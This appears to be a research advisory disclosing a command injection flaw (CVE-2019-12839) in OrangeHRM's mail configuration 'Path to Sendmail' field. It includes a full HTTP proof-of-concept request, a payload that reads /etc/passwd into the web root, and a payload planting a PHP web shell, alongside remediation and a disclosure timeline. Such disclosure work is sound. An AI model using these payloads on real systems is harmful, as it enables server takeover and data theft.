---
title: "Arbitrary Command Execution in latest OrangeHRM platform"
date: "2019-06-12"
categories: 
  - "research"
---

## Overview

- Authors: Chi Tran, Hoang Le, Hoang Doan, Phi Le, Huy Ngo
- Vendor & Product: OrangeHRM - Open Source Human Resource Management System
- Version: 4.3.1 and before
- CVE Reference: CVE-2019-12839

## About OrangeHRM

OrangeHRM Inc. is a HR software company based in Secaucus, New Jersey. The company has developed a human resources management solution. The company offers an open-source, professional, & enterprise solution. The open-source solution is free while the professional and enterprise solutions are advanced hosted solutions. OrangeHRM offers a comprehensive HR management system to suit all of your business HR needs which can also be customized according to your requirements.

## Vulnerability Detail

What is Swift Mailer? Swift Mailer integrates into any web app written in PHP, offering a flexible and elegant object-oriented approach to sending emails with a multitude of features. By default, in OrangeHRM, Swift Mailer is used to send emails using SMTP, sendmail, postfix or a custom Transport implementation of your own.

Original Git: **[https://github.com/swiftmailer/swiftmailer/blob/master/lib/classes/Swift/Transport/SendmailTransport.php](https://github.com/swiftmailer/swiftmailer/blob/master/lib/classes/Swift/Transport/SendmailTransport.php)**

An input validation error on `Path to Sendmail`  field via `listMailConfiguration` action (**Authenticated**) leads to a `Command Injection Vulnerability (ACE)` which allows attackers execute arbitrary commands.

**Cause:** When processing requests to `/listMailConfiguration`, the form does not properly sanitize the certain POST parameter `($form['txtSendmailPath'])`
**Code audit**:

![](/images/HRM.png)

As we can see above, after being supplied by an authenticated user, `$form['txtSendmailPath']` will then be sent directly to be processed.

`Path to Sendmail` will then be handled by:

{% highlight php %}
    public function testCommandCanBeSetAndFetched()
    {
        $buf = $this->_getBuffer();
        $sendmail = $this->_getSendmail($buf);

        $sendmail->setCommand('/usr/sbin/sendmail -bs');
        $this->assertEquals('/usr/sbin/sendmail -bs', $sendmail->getCommand());
        $sendmail->setCommand('/usr/sbin/sendmail -oi -t');
        $this->assertEquals('/usr/sbin/sendmail -oi -t', $sendmail->getCommand());
    }
{% endhighlight %}

This means, we can modify `Path to Sendmail` to have arbitrary commands leaded by either:
- `/usr/sbin/sendmail -bs` or `/usr/sbin/sendmail -oi -t`
    
An action of sending a test mail will execute the arbitrary commands to extract sensitive information as well as take over the server.

**Proof of Concepts:**
- Request:

```
POST /symfony/web/index.php/admin/listMailConfiguration HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/symfony/web/index.php/admin/listMailConfiguration
Content-Type: application/x-www-form-urlencoded
Content-Length: 767
Connection: close
Cookie: Loggedin=True; PHPSESSID=r1rp9com2a4n10lpbhjvfnelg4
Upgrade-Insecure-Requests: 1

emailConfigurationForm%5B\_csrf\_token%5D=426bbe900f93c903be83b3c6d4d1bcd0&emailConfigurationForm%5BtxtMailAddress%5D=myusername%40localhost&emailConfigurationForm%5BcmbMailSendingMethod%5D=sendmail&emailConfigurationForm%5BtxtSendmailPath%5D=**%2Fusr%2Fsbin%2Fsendmail+-bs%3B+%2Fbin%2Fcat+%2Fetc%2Fpasswd+%3E%3E+%2Fvar%2Fwww%2Fhtml%2Fexpose.txt**&emailConfigurationForm%5BtxtSmtpHost%5D=localhost&emailConfigurationForm%5BtxtSmtpPort%5D=25&emailConfigurationForm%5BoptAuth%5D=login&emailConfigurationForm%5BtxtSmtpUser%5D=myusername&emailConfigurationForm%5BtxtSmtpPass%5D=\*\*\*\*\*\*\*\*&emailConfigurationForm%5BoptSecurity%5D=none&emailConfigurationForm%5BchkSendTestEmail%5D=on&emailConfigurationForm%5BtxtTestEmail%5D=root%40localhost
```

- Steps to reproduce:

1 - Navigate to [http://localhost/symfony/web/index.php/admin/listMailConfiguration](http://localhost/symfony/web/index.php/admin/listMailConfiguration)

![](/images/LIST.png)

2 - Edit `Path to Sendmail` to have the following payload (limit 100 chars)
```
/usr/sbin/sendmail -bs; /bin/cat /etc/passwd >> /var/www/html/expose.txt
```

3 - Update `Test Email Address` to send a test mail

![](/images/SENT.png)

![](/images/exposed.png)


## Impact

Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

## Low-priv shell

- Payload:     

```
/usr/sbin/sendmail -bs;echo "<?php if(\\$\_GET\['c'\]){system(\\$\_GET\['c'\]);}?>" >> /var/www/html/c.php
```

![](/images/HRMShell.png)

![](/images/installHRM.png)


## Remediation

[https://github.com/orangehrm/orangehrm/pull/528](https://github.com/orangehrm/orangehrm/pull/528)

## Report Timeline

06/11/2019: Discovered the vulnerability  
06/12/2019: Reported to Vendor  
06/13/2019: Vendor confirmed  
06/14/2019: Vendor released a fix  
06/15/2019: CVE ID assigned
